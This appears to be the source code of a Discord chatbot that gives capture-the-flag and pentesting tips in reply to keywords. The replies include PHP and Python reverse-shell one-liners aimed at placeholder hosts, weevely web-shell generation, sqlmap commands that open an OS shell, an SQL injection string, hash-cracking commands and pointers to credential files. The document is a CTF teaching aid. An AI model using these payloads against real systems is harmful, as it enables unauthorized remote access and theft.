#! /usr/bin/env python3
import discord
import asyncio
import logging
import os
import random
import time

client = discord.Client(command_prefix='/', description='Basic Commands')

TOKEN = ''

# Go To https://discordapp.com/developers/applications/ and start a new application for Token

logger = logging.getLogger('discord')
logger.setLevel(logging.DEBUG)
handler = logging.FileHandler(filename='discord.log', encoding='utf-8', mode='w')
handler.setFormatter(logging.Formatter('%(asctime)s:%(levelname)s:%(name)s:%(message)s'))
logger.addHandler(handler)

async def background_loop():
    await client.wait_until_ready()
    while not client.is_closed:
        print("Booted Up @ " + time.ctime())
        await asyncio.sleep(3600)  #Bootup Message

@client.event
async def on_ready():
    print('--------------------------------------------------------------------------------------')
    print('Server Connect Link:')
    print('https://discordapp.com/api/oauth2/authorize?scope=bot&client_id=' + str(client.user.id))
    print('--------------------------------------------------------------------------------------')
    print('Logged in as:')
    print(client.user.name)
    print("or")
    print(client.user)
    print("UID:")
    print(client.user.id)
    print('---------------------------------------------')
    print("LIVE CHAT LOG - See discord.log For History")
    print("---------------------------------------------")
    await client.change_presence(activity=discord.Game("Running..."), status=discord.Status.online)

@client.event
async def on_member_join(member):
    print("Member:", member, "joined!")

@client.event
async def on_member_remove(member):
    print("Member:", member, "removed!")

@client.event
async def on_guild_role_create(role):
    print("Role:", role, "was created!")

@client.event
async def on_guild_role_delete(role):
    print("Role:", role, "was deleted!")

@client.event
async def on_guild_channel_create(channel):
    print("Channel:", channel, "was created!")

@client.event
async def on_guild_channel_delete(channel):
    print("Channel:", channel, "was deleted!")

@client.event
async def on_guild_channel_update(before, after):
    print("Channel Updated:", after)

help_standard = ['help', 'start', 'begin', 'beginning', 'hint', 'hints', 'tip', 'tips']
sql = ['sql', 'mysql', 'injection', '_', 'sql_injection']
crack = ['hash', 'hashes', 'cracking', 'crack', 'bruteforce', 'dictionary', 'rule']
upload = ['payload', 'upload', 'payloads', 'uploading', 'uploads', 'meterpreter']
lpshell = ['low', 'privelege', 'low-privelege', 'escalate', 'escalation']
gits = ['tool', 'tools', 'extra', 'helpful', 'other']
tips = ['hint', 'tip', 'hints', 'tips', 'helpful']

@client.event
async def on_message(message):
    if message.author == client.user:
        return #ignore what bot says in server so no message loop
    channel = message.channel
    print(message.author, "said:", message.content, "-- Time:", time.ctime()) #reports to discord.log and live chat

    if message.content == '/info':
        await channel.send("Hi! I'm CTFbot, a helpful chatbot to keep you on track for CTFs, Wargames, and HTBs. If you are wondering what your next step should be you can ask me things like, 'how would I upload a payload' or 'how to crack a hash' and I'll give you some helpful tips!")
        await channel.send("I also have some other core commands: /info, /nickname, /dm, /ulog, and /whoami")
        await channel.send("Download my source code @ https://github.com/Cisc0-gif/CTFbot.git")

    #text = message.content.replace(".", ' ').replace("!", ' ').replace("?", ' ').lower()
    #print(text)
    #^ for stripping chars from message string for easy interpretation

    for i in help_standard:
        if i in message.content.lower():
            await channel.send("I suggest starting with some of these tools:")
            await channel.send("--nmap -sCSV -oA IP/NAME IP -Pn -p 0-65535")
            await channel.send("--dirb http://IP >> dirb_out.txt")
            await channel.send("--cewl http://IP -d # -w cewl_wordlist.txt")
            await channel.send("--burpsuite")
            await channel.send("--nikto -h http://IP")
            await channel.send("--Don't forget to question and google everything!")
            break

    for i in sql:
        if i in message.content.lower():
            await channel.send("SQL_Injection methods:")
            await channel.send("--sqlmap -r file_with_burpsuite_var_headers.txt --dbs #dump tables from database")
            await channel.send("--sqlmap -r file.txt -D db --dump #dump data from tables ")
            await channel.send("--sqlmap -r file.txt -D db --os-shell/pwn #open shell from db or pwns with meterpreter")
            await channel.send("--' or 1==1 ")
            break

    for i in crack:
        if i in message.content.lower():
            await channel.send("Hash Cracking Methods:")
            await channel.send("--john wordlist.txt hashes.txt")
            await channel.send("--hashcat -a 0 -m # wordlist/rule/mask hashes.txt")
            await channel.send("--https://crackstation.net/")
            await channel.send("--https://gchq.github.io/CyberChef/")
            break

    for i in upload:
        if i in message.content.lower():
            await channel.send("Payloading Methods:")
            await channel.send("""--sudo /usr/bin/php -r '$sock=fsockopen("YOUR IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");' #php one liner if user has sudo for php""")
            await channel.send("""--python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("HOST",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' #python2.7 one liner """)
            await channel.send("--nc -lvp 4444 #setup listener for payloads on port 4444")
            await channel.send("""--python -c 'import pty; pty.spawn("/bin/bash")' #upgrades nc shell to full TTY shell for su change""")
            await channel.send("--msfconsole use /exploit/multi/handler #metasploit payload listener")
            await channel.send("--weevely generate weevely_payload.php password & to connect: weevely http://filepath password")
            break

    for i in lpshell:
        if i in message.content.lower():
            await channel.send("Privelege Escalation:")
            await channel.send("--sudo -l")
            await channel.send("--try an enumeration script")
            await channel.send("--check metasploit for privesc exploit")
            break

    for i in gits:
        if i in message.content.lower():
            await channel.send("GitHub Repos you might want to try:")
            await channel.send("--https://github.com/Cisc0-gif/KITT.git")
            await channel.send("--^ pentesting framework I made with hundreds of helpful scripts and tools")
            await channel.send("--https://github.com/Cisc0-gif/KITT-Lite.git")
            await channel.send("--^ pentesting cli tool I made as a lighter version of KITT with a quicker UI")
            await channel.send("--hydra # login bruteforcer for almost every protocol: ssh, ftp, http, etc.")
            await channel.send("--wfuzz & dirbuster # webapp file enumeration tools")
            await channel.send("--metasploit-framework and recon-ng #metasploit is a pentesting exploitation framework with thousands of vulnerabilities and payloads and recon-ng is a webapp OSINT tool")
            break

    for i in tips:
        if i in message.content.lower():
            await channel.send("Tips:")
            await channel.send("--apache2 servers sometimes store weblogins in /etc/apache2/.htpasswd")
            await channel.send("--checking if there's a robots.txt file in web dir can help with dir traversal")
            await channel.send("--if /etc/knockd.conf present then look inside for 3 port #s, use this one liner to open a closed port: for x in PORT1 PORT2 PORT3; do nmap -Pn --max-retries 0 -p $x IP; done")
            await channel.send("--Google and question everything! Research services, programs, and exploits!")

    if message.content == "/nickname": #if author types /nickname bot asks for input for new nickname
        await channel.send("Type /name nicknamehere")
        def check(msg):
          return msg.content.startswith('/name')
        message = await client.wait_for('message', check=check)
        name = message.content[len('/name'):].strip()
        await channel.send('{} is your new nickname'.format(name))
        await message.author.edit(nick=name)
    if message.content == "/dm": #if author types /dm bot creates dm with author
        await channel.send("Creating DM with " + str(message.author))
        await message.author.send('*DM started with ' + str(message.author) + '*')
        await message.author.send('Hello!')
    if message.content == "/ulog": #if author types /ulog bot displays updatelog
        try:
          f = open("update_log.txt","r")
          if f.mode == 'r':
            contents = f.read()
            await channel.send(contents)
        finally:
          f.close()
    if message.content == "/whoami": #if author types /whoami bot responds with username
        await channel.send(message.author)

client.loop.create_task(background_loop())
client.run(TOKEN)
